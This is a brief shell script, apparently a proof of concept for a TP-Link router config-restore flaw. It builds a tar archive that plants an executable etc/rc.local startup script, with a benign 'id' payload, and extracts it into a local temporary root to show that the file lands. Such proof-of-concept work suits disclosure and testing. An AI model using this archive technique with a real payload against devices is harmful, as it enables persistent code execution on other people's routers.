#!/bin/sh
set -eu

WORK="${TMPDIR:-/tmp}/tplink_be_restore_rc_local_chain_$$"
ARCHIVE="$WORK/restore_rc_local_poc.tgz"
ROOT="$WORK/root"
PAYLOAD="$WORK/payload"

rm -rf "$WORK"
mkdir -p "$ROOT" "$PAYLOAD/etc"

cat > "$PAYLOAD/etc/rc.local" <<'EOF'
#!/bin/sh
id > /tmp/tplink_be_restore_rc_local_poc
EOF
chmod 0755 "$PAYLOAD/etc/rc.local"

(cd "$PAYLOAD" && tar -czf "$ARCHIVE" etc/rc.local)
tar -xzC "$ROOT" -f "$ARCHIVE"

test -x "$ROOT/etc/rc.local"

echo "archive=$ARCHIVE"
echo "root=$ROOT"
echo "wrote=$ROOT/etc/rc.local"
echo "payload=$(tr '\n' ';' < "$ROOT/etc/rc.local")"
sha256sum "$ARCHIVE"
